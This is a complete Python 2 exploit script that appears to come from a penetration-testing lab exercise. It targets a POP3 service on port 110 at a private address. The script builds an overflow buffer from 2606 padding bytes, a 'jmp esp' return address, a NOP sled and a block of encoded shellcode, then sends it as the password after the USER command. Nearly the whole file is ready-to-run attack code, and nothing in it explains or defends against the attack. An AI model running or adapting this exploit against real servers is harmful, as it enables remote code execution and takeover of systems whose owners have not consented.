#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xbd\xca\x9e\x87\x0c\xda\xc5\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x83\xc7\x04\x31\x6f\x0e\x03\xa5\x90\x65\xf9\xc5\x45\xeb"
"\x02\x35\x96\x8c\x8b\xd0\xa7\x8c\xe8\x91\x98\x3c\x7a\xf7\x14"
"\xb6\x2e\xe3\xaf\xba\xe6\x04\x07\x70\xd1\x2b\x98\x29\x21\x2a"
"\x1a\x30\x76\x8c\x23\xfb\x8b\xcd\x64\xe6\x66\x9f\x3d\x6c\xd4"
"\x0f\x49\x38\xe5\xa4\x01\xac\x6d\x59\xd1\xcf\x5c\xcc\x69\x96"
"\x7e\xef\xbe\xa2\x36\xf7\xa3\x8f\x81\x8c\x10\x7b\x10\x44\x69"
"\x84\xbf\xa9\x45\x77\xc1\xee\x62\x68\xb4\x06\x91\x15\xcf\xdd"
"\xeb\xc1\x5a\xc5\x4c\x81\xfd\x21\x6c\x46\x9b\xa2\x62\x23\xef"
"\xec\x66\xb2\x3c\x87\x93\x3f\xc3\x47\x12\x7b\xe0\x43\x7e\xdf"
"\x89\xd2\xda\x8e\xb6\x04\x85\x6f\x13\x4f\x28\x7b\x2e\x12\x25"
"\x48\x03\xac\xb5\xc6\x14\xdf\x87\x49\x8f\x77\xa4\x02\x09\x80"
"\xcb\x38\xed\x1e\x32\xc3\x0e\x37\xf1\x97\x5e\x2f\xd0\x97\x34"
"\xaf\xdd\x4d\x9a\xff\x71\x3e\x5b\xaf\x31\xee\x33\xa5\xbd\xd1"
"\x24\xc6\x17\x7a\xce\x3d\xf0\x8f\x04\x3d\x25\xf8\x18\x3d\x24"
"\x43\x95\xdb\x4c\xa3\xf0\x74\xf9\x5a\x59\x0e\x98\xa3\x77\x6b"
"\x9a\x28\x74\x8c\x55\xd9\xf1\x9e\x02\x29\x4c\xfc\x85\x36\x7a"
"\x68\x49\xa4\xe1\x68\x04\xd5\xbd\x3f\x41\x2b\xb4\xd5\x7f\x12"
"\x6e\xcb\x7d\xc2\x49\x4f\x5a\x37\x57\x4e\x2f\x03\x73\x40\xe9"
"\x8c\x3f\x34\xa5\xda\xe9\xe2\x03\xb5\x5b\x5c\xda\x6a\x32\x08"
"\x9b\x40\x85\x4e\xa4\x8c\x73\xae\x15\x79\xc2\xd1\x9a\xed\xc2"
"\xaa\xc6\x8d\x2d\x61\x43\xad\xcf\xa3\xbe\x46\x56\x26\x03\x0b"
"\x69\x9d\x40\x32\xea\x17\x39\xc1\xf2\x52\x3c\x8d\xb4\x8f\x4c"
"\x9e\x50\xaf\xe3\x9f\x70")


#5f4a358f ffe4 jmp esp

buffer = 'A' * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

try:
	print "\nsending evil buffer..."
	s.connect(('10.11.22.107',110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!"
except:
	print "Could not connect to pop3!"
